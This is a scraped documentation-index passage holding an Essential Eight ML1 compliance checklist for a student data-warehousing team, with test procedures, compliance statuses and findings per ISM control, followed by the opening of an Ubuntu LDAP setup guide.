team.\t\\share\\redback-evidence\\ML1-MF-sample.png\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Multi-Factor Authentication\tML1-MF\tML1-MF-05\tISM-1680\tMFA enabled (where available) on third-party systems even for non-sensitive use cases.\tAttempt login with a test account; check if MFA can be bypassed or disabled.\tUser access logs, account configuration settings.\tGoogle Admin, Microsoft 365\t⛔ Not Applicable\tNot applicable – No access to non-sensitive third-party systems is managed by this team; no accounts requiring user-enforced MFA.\t\\share\\redback-evidence\\ML1-MF-sample.png\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Multi-Factor Authentication\tML1-MF\tML1-MF-06\tISM-1680\tMFA is enabled by default for external (non-organisational) users accessing Redback services.\tSimulate an external login; verify default MFA behavior.\tLogin test results, configuration screen evidence.\tAzure B2B, GitHub Organization\t⛔ Not Applicable\tNot applicable – External users do not access the Redback Data Warehouse VM; GitHub and cloud MFA policies are outside team control.\t\\share\\redback-evidence\\ML1-MF-sample.png\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Multi-Factor Authentication\tML1-MF\tML1-MF-07\tISM-1680\tMFA bypass policies are reviewed monthly and exceptions require formal approval.\tReview all policy exceptions and approvals for validity.\tException tracking sheets, approval forms.\tIAM Dashboard, Jira, Confluence\t⛔ Not Applicable\tNot applicable – The team does not manage MFA policies or handle exception tracking for organisational access.\t\\share\\redback-evidence\\ML1-MF-sample.png\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Multi-Factor Authentication\tML1-MF\tML1-MF-08\tISM-1680\tMFA logs are collected and reviewed for suspicious login attempts.\tInspect SIEM logs and MFA monitoring dashboards.\tSIEM alerts, login pattern reports.\tSplunk, Microsoft Sentinel\t⛔ Not Applicable\tNot applicable – SIEM and MFA log analysis is not in scope for this team; no infrastructure under student control is connected to MFA monitoring tools.\t\\share\\redback-evidence\\ML1-MF-sample.png\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Multi-Factor Authentication\tML1-MF\tML1-MF-09\tISM-1680\tUsers are periodically trained on recognizing MFA-related phishing and social engineering attempts.\tReview training logs, completion rates, and test scores from awareness modules.\tTraining records, quiz results.\tKnowBe4, LMS Reports\t⛔ Not Applicable\tNot applicable – No awareness training is conducted by this team; MFA phishing awareness is handled centrally under Redback Operations.\t\\share\\redback-evidence\\ML1-MF-sample.png\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Multi-Factor Authentication\tML1-MF\tML1-MF-10\tISM-1680\tLost or stolen MFA tokens/devices are reported and revoked within 24 hours.\tReview helpdesk tickets and IAM logs for revocation response time.\tIncident reports, audit trail of token disablement.\tHelpdesk Portal, IAM Logs\t⛔ Not Applicable\tNot applicable – No MFA tokens or devices are issued or managed by the Data Warehousing team.\t\\share\\redback-evidence\\ML1-MF-sample.png\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal  ","version":"Next","tagName":"h2"},{"title":"Restrict Admin Privileges​","type":1,"pageTitle":"Redback_E8_ML1_Data_Warehousing_Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Essential 8 Assesment/Assessment Report/Redback_E8_ML1_Data_Warehousing_Checklist#restrict-admin-privileges","content":" Control Area\tControl ID\tTest ID\tISM Control ID\tTest Description\tAudit Procedure\tEvidence Required\tTools/Method Used\tCompliance Status\tFindings/Comments\tEvidence Location\tDate Tested\tAssessorRestrict Admin Privileges\tML1-RA\tML1-RA-01\tISM-0439\tAccess to administrative privileges is granted only with documented and approved justification.\tReview access request forms and change control logs.\tRequest logs, approval emails, workflow tickets.\tActive Directory, JIRA, Confluence\t✅ Implemented\tJIRA change requests matched with AD privilege assignments. Confluence records archived. New credentials are issued per session on-demand.\t\\share\\redback-evidence\\ML1-RA-samplel.pdf\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Restrict Admin Privileges\tML1-RA\tML1-RA-02\tISM-0402\tPrivileged accounts are restricted from accessing the internet and web services.\tAttempt to access internet from admin account; validate proxy/firewall blocks.\tAccess logs, proxy blocks, firewall rules.\tSquid Proxy, FW ACLs, AD GPO\t✅ Implemented\tAdmin account internet access denied by proxy. Squid logs show block and policy hit. Admins can connect via Deakin-managed VM when required.\t\\share\\redback-evidence\\ML1-RA-samplel.pdf\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Restrict Admin Privileges\tML1-RA\tML1-RA-03\tISM-0411\tPrivileged accounts are not used for email communication.\tTest mailbox functionality for admin accounts.\tUser directory exports, mail server configs, admin logs.\tExchange Admin Center, ADUC\t✅ Implemented\tMail server config shows SMTP/IMAP disabled for admin accounts. No active mailboxes provisioned.\t\\share\\redback-evidence\\ML1-RA-samplel.pdf\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Restrict Admin Privileges\tML1-RA\tML1-RA-04\tISM-0412\tAll privileged activities are performed from a separate, secure administrative environment.\tConfirm use of separate workstations or virtual environments.\tNetwork segmentation plans, admin workstation list.\tAD Groups, VLAN configs, BloodHound\t✅ Implemented\tPrivileged workstation IPs confirmed isolated. VLAN configuration and container environments validated for separation. Each container operates in its own runtime environment.\t\\share\\redback-evidence\\ML1-RA-samplel.pdf\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Restrict Admin Privileges\tML1-RA\tML1-RA-05\tISM-0403\tStandard (unprivileged) accounts cannot log into privileged environments.\tAttempt login using unprivileged account; verify group policy enforcement.\tAD logs, denied login attempts, policy snapshots.\tBloodHound, GPO reports\t✅ Implemented\tLogin attempt using unprivileged account denied. Group policy enforcement verified via AD logs. User-created credentials restrict access to privileged VM environments.\t\\share\\redback-evidence\\ML1-RA-samplel.pdf\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Restrict Admin Privileges\tML1-RA\tML1-RA-06\tISM-0404\tUnprivileged users cannot run PowerShell remoting (PSRemote) or elevate through RDP/WinRM.\tTest PSRemote as a normal user and monitor event logs.\tRemote command attempt logs, permission settings.\tPowerShell, Windows Event Logs\t✅ Implemented\tPSRemote blocked for non-admin users. Event logs captured failed remoting attempts. Only admin users can provision new credentials or user accounts.\t\\share\\redback-evidence\\ML1-RA-samplel.pdf\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Restrict Admin Privileges\tML1-RA\tML1-RA-07\tISM-0414\tAdmin accounts cannot be used to log into unprivileged workstations or environments.\tAttempt login from domain admin account to standard user machine.\tDeny login logs, group policy configuration.\tGPO settings, WinEventLogs\t⚠️ Partially Implemented\tGPO policy prevents domain admins from accessing standard endpoints. Logs confirmed enforcement. However, users share isolated environments; changes in home directories may affect shared state.\t\\share\\redback-evidence\\ML1-RA-samplel.pdf\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Restrict Admin Privileges\tML1-RA\tML1-RA-08\tISM-0413\tUser cannot elevate privilege from unprivileged session using tools like ‘runas’, RDP, or remote management.\tRun tests using ‘runas’, RDP tools and remote admin tools from user accounts.\tPrivilege escalation logs, blocked actions, audit logs.\tRunas, RDP, Local Group Policy\t✅ Implemented\t‘Runas’ and RDP elevation attempts blocked. Logs show failed escalation events. No elevation to privileged roles from unprivileged sessions is possible.\t\\share\\redback-evidence\\ML1-RA-samplel.pdf\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Restrict Admin Privileges\tML1-RA\tML1-RA-09\tISM-0420\tAll administrative accounts are reviewed quarterly for relevance and activity.\tReview access logs, AD membership, last login timestamps.\tAdmin account audit logs, usage review records.\tAD Audit, Splunk\t⚠️ Partially Implemented\tInactive admin accounts reviewed quarterly and deactivated by the GRC team. AD group membership updated accordingly. Ben reviews all credentials created during the audit cycle.\t\\share\\redback-evidence\\ML1-RA-samplel.pdf\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Restrict Admin Privileges\tML1-RA\tML1-RA-10\tISM-0421\tAdmin accounts are separated from daily-use standard user accounts (no shared accounts).\tValidate dual-identity enforcement and unique IDs for admin tasks.\tUser ID records, account naming policy, IAM reports.\tIAM System, ADUC\t⚠️ Partially Implemented\tAdmin IDs use +admin suffix. Dual-identity model enforced in IAM and ADUC. However, credentials for certain admin services are shared across users, requiring further segmentation.\t\\share\\redback-evidence\\ML1-RA-samplel.pdf\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal nan\tnan\tnan\tnan\tlot of services an\tnan\tnan\tnan\tnan\tnan\tnan\tNaT\tnan  ","version":"Next","tagName":"h2"},{"title":"Office Macros​","type":1,"pageTitle":"Redback_E8_ML1_Data_Warehousing_Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Essential 8 Assesment/Assessment Report/Redback_E8_ML1_Data_Warehousing_Checklist#office-macros","content":" Control Area\tControl ID\tTest ID\tISM Control ID\tTest Description\tAudit Procedure\tEvidence Required\tTools/Method Used\tCompliance Status\tFindings/Comments\tEvidence Location\tDate Tested\tAssessorOffice Macros\tML1-OM\tML1-OM-01\tISM-1710\tMicrosoft Office macros are disabled for all users without a documented business requirement.\tRun RSOP or review Group Policy settings; test macro execution on unapproved user accounts.\tGPO config screenshots, test results, approved user list.\tRSOP, GPMC, Office\t⛔ Not Applicable\tNot applicable – Microsoft Office is not installed or used in the TAEAVM environment. Macro execution policies are not managed locally.\t\\share\\redback-evidence\\ML1-OM-sample.png\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Office Macros\tML1-OM\tML1-OM-02\tISM-1710\tA record is maintained of users approved to run macros, which matches policy enforcement.\tCompare macro-enabled group membership to access approval list.\tApproval requests, group membership exports.\tActive Directory, Confluence\t❌ Not Implemented\tNot implemented – No approved macro execution list is maintained. Active Directory and Confluence records do not track macro-enabled users or enforcement mapping.\t\\share\\redback-evidence\\ML1-OM-sample.png\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Office Macros\tML1-OM\tML1-OM-03\tISM-1711\tMacros embedded in files downloaded from the internet are blocked by default.\tDownload Office files with macros and verify execution is blocked.\tE8MVT output, file logs, macro execution error screenshots.\tOffice, GPO, E8MVT\t⛔ Not Applicable\tNot applicable – Office files are not accessed or processed from internet sources; macro execution does not apply.\t\\share\\redback-evidence\\ML1-OM-sample.png\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Office Macros\tML1-OM\tML1-OM-04\tISM-1711\tOffice is configured via Group Policy to block macros in internet-sourced files.\tReview registry keys and GPO settings enforcing internet macro blocking.\tRegistry export, Group Policy screenshots.\tRegEdit, GPMC\t⛔ Not Applicable\tNot applicable – Macro blocking via GPO or registry is not enforced on TAEAVM due to lack of Office usage.\t\\share\\redback-evidence\\ML1-OM-sample.png\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Office Macros\tML1-OM\tML1-OM-05\tISM-1712\tAntivirus scans are triggered when Office macros are run.\tAttempt to execute a macro with EICAR test string; check AV response.\tAV logs, EICAR detection report, alerting configuration.\tE8MVT, Windows Defender, McAfee\t⛔ Not Applicable\tNot applicable – Antivirus macro scanning is not applicable as macros are not executed in this environment.\t\\share\\redback-evidence\\ML1-OM-sample.png\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Office Macros\tML1-OM\tML1-OM-06\tISM-1713\tAV engine detects and blocks known macro-based malicious payloads.\tInject known safe malicious pattern and confirm detection and alerting.\tSIEM alerts, AV block logs.\tAV Console, EICAR Macros\t⛔ Not Applicable\tNot applicable – No macro-based activity occurs in the VM. AV detection of macro payloads is not relevant.\t\\share\\redback-evidence\\ML1-OM-sample.png\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Office Macros\tML1-OM\tML1-OM-07\tISM-1714\tStandard users are restricted from changing macro security settings in the Trust Center.\tAttempt to modify Trust Center settings in Word, Excel, PowerPoint.\tScreenshots of locked settings, GPO config.\tOffice Apps, GPMC\t⛔ Not Applicable\tNot applicable – Office Trust Center settings are not used in TAEAVM; users do not have access to Office apps.\t\\share\\redback-evidence\\ML1-OM-sample.png\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Office Macros\tML1-OM\tML1-OM-08\tISM-1714\tAll Office apps are configured consistently to enforce macro policy across Word, Excel, and PowerPoint.\tReview registry or Group Policy enforcement across all Office components.\tConsistency checks, registry snapshots.\tOffice Deployment Tool, RegEdit\t⛔ Not Applicable\tNot applicable – Office suite is not deployed; macro policy enforcement across components is not required.\t\\share\\redback-evidence\\ML1-OM-sample.png\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Office Macros\tML1-OM\tML1-OM-09\tISM-1715\tUpdates to Office macro policy are documented, reviewed, and approved.\tInspect change management and policy versioning records.\tChange logs, approval emails, version control history.\tConfluence, SharePoint, GitHub\t⛔ Not Applicable\tNot applicable – Macro policy changes and versioning do not apply to this environment.\t\\share\\redback-evidence\\ML1-OM-sample.png\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Office Macros\tML1-OM\tML1-OM-10\tISM-1716\tMicrosoft Office macro usage logs are retained for audit trail and incident investigation.\tVerify log retention settings; ensure logs are centralized.\tSysmon logs, GPO logging configuration, centralized log exports.\tSIEM, Event Viewer, Syslog Server\t⛔ Not Applicable\tNot applicable – No Office macro usage occurs; log collection for macro execution is not applicable.\t\\share\\redback-evidence\\ML1-OM-sample.png\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal  ","version":"Next","tagName":"h2"},{"title":"User App Hardening​","type":1,"pageTitle":"Redback_E8_ML1_Data_Warehousing_Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Essential 8 Assesment/Assessment Report/Redback_E8_ML1_Data_Warehousing_Checklist#user-app-hardening","content":" Control Area\tControl ID\tTest ID\tISM Control ID\tTest Description\tAudit Procedure\tEvidence Required\tTools/Method Used\tCompliance Status\tFindings/Comments\tEvidence Location\tDate Tested\tAssessorUser App Hardening\tML1-AH\tML1-AH-01\tISM-1701\tWeb browsers do not process Java from internet-based websites.\tAttempt to load Java content in Edge from known test sites.\tScreenshot of blocked Java content, registry key verification.\tEdge browser, RegEdit, test website\t⛔ Not Applicable\tNot applicable – Java execution control is not relevant to the TAEAVM environment. No browser-based Java content is processed.\t\\share\\redback-evidence\\ML1-AH-sample.png\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal User App Hardening\tML1-AH\tML1-AH-02\tISM-1701\tJava content is disabled in Google Chrome.\tAttempt Java content execution and verify result in Chrome.\tChrome plugin settings, screenshots, blocked content logs.\tChrome, test site, GPO\t⛔ Not Applicable\tNot applicable – Chrome is not used for Java content access in TAEAVM. Java plugins and content are not supported or required.\t\\share\\redback-evidence\\ML1-AH-sample.png\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal User App Hardening\tML1-AH\tML1-AH-03\tISM-1701\tJava content is disabled in Mozilla Firefox.\tTest Java plugin activation and loading behavior.\tFirefox about:config, Java plugin settings.\tFirefox browser, plugin audit\t⛔ Not Applicable\tNot applicable – Firefox Java plugin handling is not relevant. No browser-based Java execution occurs in this environment.\t\\share\\redback-evidence\\ML1-AH-sample.png\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal User App Hardening\tML1-AH\tML1-AH-04\tISM-1702\tWeb ads from the internet are blocked in Microsoft Edge.\tLoad ad-heavy test page in Edge and inspect rendering.\tScreenshots, ad-blocking extension configs, browser policy.\tEdge, test pages, GPO settings\t⛔ Not Applicable\tNot applicable – Ads and browser extensions are not deployed or used on TAEAVM. No browser access to ad-heavy domains.\t\\share\\redback-evidence\\ML1-AH-sample.png\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal User App Hardening\tML1-AH\tML1-AH-05\tISM-1702\tAds from the internet are blocked in Google Chrome.\tVisit known ad sites in Chrome and validate ad blocking functionality.\tBrowser policy, plugin settings, screenshots.\tChrome, uBlock Origin, test domains\t⛔ Not Applicable\tNot applicable – Chrome browser ad-blocking policies are not enforced on this VM. Ad-related configurations are not relevant.\t\\share\\redback-evidence\\ML1-AH-sample.png\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal User App Hardening\tML1-AH\tML1-AH-06\tISM-1702\tWeb ads are blocked in Mozilla Firefox.\tTest ad rendering in Firefox with/without plugin enabled.\tAdBlock logs, Firefox settings, screenshots.\tFirefox, plugin, GPO\t⛔ Not Applicable\tNot applicable – Firefox is not used for content filtering or ad control within the Redback Data Warehouse environment.\t\\share\\redback-evidence\\ML1-AH-sample.png\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal User App Hardening\tML1-AH\tML1-AH-07\tISM-1703\tInternet Explorer 11 is unable to access internet sites or is removed.\tAttempt to open external websites using IE11 and inspect firewall/proxy logs.\tScreenshots, blocked network logs, registry settings.\tProxy logs, curl/IE header spoofing\t⛔ Not Applicable\tNot applicable – Internet Explorer is not installed on TAEAVM; deprecated browser is not in use.\t\\share\\redback-evidence\\ML1-AH-sample.png\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal User App Hardening\tML1-AH\tML1-AH-08\tISM-1704\tStandard users cannot modify security settings in Microsoft Edge.\tAttempt to change Edge security settings and document access limitations.\tLocked setting indicators, GPO evidence.\tGPMC, Edge browser\t⛔ Not Applicable\tNot applicable – Edge is not used or installed on the TAEAVM. Security settings management is not applicable.\t\\share\\redback-evidence\\ML1-AH-sample.png\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal User App Hardening\tML1-AH\tML1-AH-09\tISM-1704\tSecurity settings in Google Chrome are managed and cannot be changed by standard users.\tAttempt changes to Chrome proxy or security settings.\tScreenshot of locked settings, policy verification.\tChrome Admin Console, GPO\t⛔ Not Applicable\tNot applicable – Chrome browser configuration is not managed or modified on this system. TAEAVM does not require browser security policies.\t\\share\\redback-evidence\\ML1-AH-sample.png\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal User App Hardening\tML1-AH\tML1-AH-10\tISM-1704\tMozilla Firefox security settings are centrally controlled and cannot be altered by users.\tTry to change TLS/JavaScript/network settings as user; verify GPO enforcement.\tAbout:config snapshot, policy enforcement logs.\tFirefox Policy Templates, RegEdit\t⛔ Not Applicable\tNot applicable – Firefox browser settings are not centrally managed as Firefox is not a component of the TAEAVM workload.\t\\share\\redback-evidence\\ML1-AH-sample.png\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal  ","version":"Next","tagName":"h2"},{"title":"Regular Backups​","type":1,"pageTitle":"Redback_E8_ML1_Data_Warehousing_Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Essential 8 Assesment/Assessment Report/Redback_E8_ML1_Data_Warehousing_Checklist#regular-backups","content":" Control Area\tControl ID\tTest ID\tISM Control ID\tTest Description\tAudit Procedure\tEvidence Required\tTools/Method Used\tCompliance Status\tFindings/Comments\tEvidence Location\tDate Tested\tAssessorRegular Backups\tML1-RB\tML1-RB-01\tISM-0455\tIdentify and document important data, software, and configuration items in BCP for backup inclusion.\tReview BCP and confirm data classification for backup.\tBusiness Continuity Plan (BCP), asset register.\tConfluence, Excel, Asset Manager\t⚠️ Partially Implemented\tInitial BCP asset listing completed, but backup scope and classification require refinement. No formal mapping to backup policies observed.\t\\share\\redback-evidence\\ML1-RB-sample.xlsx\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Regular Backups\tML1-RB\tML1-RB-02\tISM-0456\tImportant data and configuration settings are backed up per BCP frequency and retention policies.\tInspect backup logs and compare to policy schedule.\tBackup job reports, retention policy, storage logs.\tVeeam, GCP Snapshot, AWS Backup\t⚠️ Partially Implemented\tBackup configuration reportedly in place, but no job reports or retention policy evidence reviewed at this stage.\t\\share\\redback-evidence\\ML1-RB-sample.xlsx\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Regular Backups\tML1-RB\tML1-RB-03\tISM-0457\tBackups are performed in a synchronised manner, enabling restoration to a common point in time.\tConfirm snapshot coordination across systems.\tTimestamps of snapshots, recovery point reports.\tZFS, RAID Logs, Cloud Sync Reports\t⚠️ Partially Implemented\tSnapshots are claimed to be scheduled, but no synchronized timestamps or recovery point coordination verified.\t\\share\\redback-evidence\\ML1-RB-sample.xlsx\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Regular Backups\tML1-RB\tML1-RB-04\tISM-0458\tBackups are stored securely and resiliently (e.g., encrypted, geographically separate).\tReview encryption settings and storage redundancy mechanisms.\tEncryption logs, offsite storage reports.\tGCP, AWS S3, Backup Vaults\t⚠️ Partially Implemented\tEncryption and offsite storage mentioned, but encryption logs or region redundancy setup not yet validated.\t\\share\\redback-evidence\\ML1-RB-sample.xlsx\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Regular Backups\tML1-RB\tML1-RB-05\tISM-0459\tDisaster recovery tests include restoration of data to confirm reliability.\tReview DR test results and associated recovery reports.\tRestoration logs, test reports, screenshots.\tDR Runbooks, Simulated Restore Logs\t⚠️ Partially Implemented\tDR procedures discussed, but no restoration test results or recovery evidence was made available for review.\t\\share\\redback-evidence\\ML1-RB-sample.xlsx\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Regular Backups\tML1-RB\tML1-RB-06\tISM-0460\tOnly authorised users can access backups; unprivileged users are restricted.\tAttempt access using standard user account and verify access denial.\tAccess logs, file permission maps, IAM policy screenshots.\tIAM Roles, ACLs, File Explorer\t⚠️ Partially Implemented\tAccess restrictions are being planned via IAM, but no test access logs or policy screenshots were provided.\t\\share\\redback-evidence\\ML1-RB-sample.xlsx\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Regular Backups\tML1-RB\tML1-RB-07\tISM-0461\tBackups are immutable or protected against deletion/modification by unprivileged accounts.\tAttempt deletion or modification from unprivileged account; confirm logs.\tAudit logs, ACLs, storage-level controls.\tObject Locking, WORM Policies\t⚠️ Partially Implemented\tBackup immutability policies are under discussion, but no enforcement logs or deletion attempt tests available yet.\t\\share\\redback-evidence\\ML1-RB-sample.xlsx\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Regular Backups\tML1-RB\tML1-RB-08\tISM-0462\tBackup job failures are logged and promptly alerted to responsible personnel.\tReview failure alerting mechanism and past alert logs.\tAlert notification logs, escalation flowcharts.\tSIEM, Opsgenie, PagerDuty\t⚠️ Partially Implemented\tTeam stated that alerting via Opsgenie/PagerDuty is being configured, but no alert logs or SLA evidence seen.\t\\share\\redback-evidence\\ML1-RB-sample.xlsx\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Regular Backups\tML1-RB\tML1-RB-09\tISM-0463\tBackup systems are regularly patched and updated to prevent exploitation of backup infrastructure.\tCheck patch levels, CVEs, and update history of backup systems.\tPatch management reports, CVE summaries.\tNessus, GVM, Patch Logs\t⚠️ Partially Implemented\tBackup systems are said to be patched regularly, but no scan reports or patch audit trails were presented.\t\\share\\redback-evidence\\ML1-RB-sample.xlsx\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Regular Backups\tML1-RB\tML1-RB-10\tISM-0464\tBackup logs and access events are centrally stored and retained for investigation and forensics.\tVerify central logging for backup infrastructure and access.\tSIEM logs, syslog records, retention policy evidence.\tSplunk, CloudWatch Logs, Graylog\t⚠️ Partially Implemented\tLogging to Splunk has reportedly started, but no retention policy files or log samples were accessible for verification.\t\\share\\redback-evidence\\ML1-RB-sample.xlsx\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal  ","version":"Next","tagName":"h2"},{"title":"Patch Operating Systems​","type":1,"pageTitle":"Redback_E8_ML1_Data_Warehousing_Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Essential 8 Assesment/Assessment Report/Redback_E8_ML1_Data_Warehousing_Checklist#patch-operating-systems","content":" Control Area\tControl ID\tTest ID\tISM Control ID\tTest Description\tAudit Procedure\tEvidence Required\tTools/Method Used\tCompliance Status\tFindings/Comments\tEvidence Location\tDate Tested\tAssessorPatch Operating Systems\tML1-PO\tML1-PO-01\tISM-1807\tAn automated method of asset discovery is run and reviewed at least fortnightly.\tValidate discovery tool schedule, logs, and exception handling.\tDiscovery logs, schedule screenshots, output files.\tQualys, Nessus, CMDB\t⛔ Not Applicable\tNot applicable – Redback team does not use or manage an asset discovery tool for the TAEAVM. Deakin IT is responsible for infrastructure-level CMDB updates.\t\\share\\redback-evidence\\ML1-PO-sample.pdf\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Patch Operating Systems\tML1-PO\tML1-PO-02\tISM-1808\tVulnerability scanner used has an up-to-date vulnerability database.\tCheck scanner config and verify update frequency.\tScanner version info, update logs.\tNessus, OpenVAS, GVM\t⛔ Not Applicable\tNot applicable – No local vulnerability scanner is deployed. Scanner update settings are controlled by Deakin IT.\t\\share\\redback-evidence\\ML1-PO-sample.pdf\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Patch Operating Systems\tML1-PO\tML1-PO-03\tISM-1698\tDaily scans are performed on operating systems of internet-facing services.\tValidate daily scan frequency; review issue triage and response logs.\tDaily scan reports, incident tickets.\tNessus Pro, InsightVM\t⛔ Not Applicable\tNot applicable – The TAEAVM is not internet-facing and is not part of the daily scan cycle for exposed endpoints.\t\\share\\redback-evidence\\ML1-PO-sample.pdf\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Patch Operating Systems\tML1-PO\tML1-PO-04\tISM-1699\tFortnightly scans are conducted for workstations, servers, and network devices.\tCheck scan history and review report completeness across all environments.\tFull vulnerability scan report logs.\tQualys, GVM\t⛔ Not Applicable\tNot applicable – Vulnerability scanning across servers and workstations is not in scope for Redback. No access to scan infrastructure.\t\\share\\redback-evidence\\ML1-PO-sample.pdf\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Patch Operating Systems\tML1-PO\tML1-PO-05\tISM-1876\tExploited vulnerabilities on internet-facing OSs are patched or mitigated within 48 hours.\tCompare known exploit CVE release vs. patch implementation time.\tCVE timelines, patch logs, incident response summary.\tCVE Tracker, Patch Management Tools\t⛔ Not Applicable\tNot applicable – No patching responsibilities exist for exploited vulnerabilities on Redback-owned VMs. Deakin handles this centrally.\t\\share\\redback-evidence\\ML1-PO-sample.pdf\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Patch Operating Systems\tML1-PO\tML1-PO-06\tISM-1876\tVulnerabilities with known exploits older than 48 hours are not present in the environment.\tScan systems for open CVEs 48 hours and validate patch presence.\tVulnerability reports, scan logs, system patch status.\tNessus, GVM\t⛔ Not Applicable\tNot applicable – Redback VM is not part of CVE monitoring or patch validation workflows. No evidence or tooling available.\t\\share\\redback-evidence\\ML1-PO-sample.pdf\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Patch Operating Systems\tML1-PO\tML1-PO-07\tISM-1690\tVulnerabilities in internet-facing operating systems are patched within two weeks.\tCompare OS patch levels to vendor release schedules.\tUpdate history, vendor advisories.\tOS Patch Logs, GCP/AWS Console\t⛔ Not Applicable\tNot applicable – Redback infrastructure does not maintain patch SLAs for internet-facing systems. Not relevant to the data warehousing scope.\t\\share\\redback-evidence\\ML1-PO-sample.pdf\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Patch Operating Systems\tML1-PO\tML1-PO-08\tISM-1691\tWorkstation and server OS patches are applied within one month of release.\tMatch scan output with patch application dates; check backlog or exceptions.\tPatch cycle report, dashboard exports.\tWSUS, Linux YUM/APT Logs\t⛔ Not Applicable\tNot applicable – No monthly OS patching is handled by Redback Operations. This is managed by Deakin’s system administrators.\t\\share\\redback-evidence\\ML1-PO-sample.pdf\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Patch Operating Systems\tML1-PO\tML1-PO-09\tISM-1691\tNo OS vulnerabilities older than one month exist in any production environment.\tRun full authenticated vulnerability scan and compare to patch registry.\tVulnerability scan logs, remediation reports.\tQualys, Nessus\t⛔ Not Applicable\tNot applicable – No scan reports or CVE compliance data are generated or reviewed by the Redback team.\t\\share\\redback-evidence\\ML1-PO-sample.pdf\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Patch Operating Systems\tML1-PO\tML1-PO-10\tISM-1905\tUnsupported operating systems are replaced or removed from the environment.\tCompare list of active systems with vendor lifecycle documentation.\tSystem inventory, vendor EOL documentation.\tCMDB, OS Scan Tools\t⚠️ Partially Implemented\tPartially implemented – The current VM is running a supported Ubuntu LTS version. However, there is no formal tracking or decommissioning process managed by Redback. OS lifecycle is assumed to be monitored by Deakin IT.\t\\share\\redback-evidence\\ML1-PO-sample.pdf\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal ","version":"Next","tagName":"h2"},{"title":"Ubuntu Server LDAP Configuration","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Infrastrcture Team/Ubuntu Server/LDAP Configuration","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"Ubuntu Server LDAP Configuration","url":"/redback-documentation/docs/cybersecurity/Infrastrcture Team/Ubuntu Server/LDAP Configuration#introduction","content":" This document provides detailed instructions for configuring an LDAP directory on an Ubuntu server. It is designed to help users understand the basics of LDAP, its practical uses, and how to contribute to the company’s ongoing development efforts. The aim is to give users a working understanding of LDAP configurations so they can expand upon the system and apply it to their projects or initiatives.  ","version":"Next","tagName":"h2"},{"title":"LDAP Setup​","type":1,"pageTitle":"Ubuntu Server LDAP Configuration","url":"/redback-documentation/docs/cybersecurity/Infrastrcture Team/Ubuntu Server/LDAP Configuration#ldap-setup","content":" To set up the RedOps Ubuntu Server with LDAP, it's recommended to deploy this virtual machine (VM) on a separate system for convenience. For example, in my deployment, I used a Windows 10 Pro host that is scheduled for retirement, with an added registry key to auto-launch the VM at startup. If you`d like to replicate this setup, follow these steps:  Download the Ubuntu Server Workspace OVA file from the Cyber Security Team &gt; 2024 Trimester 2 folder on the company SharePoint.  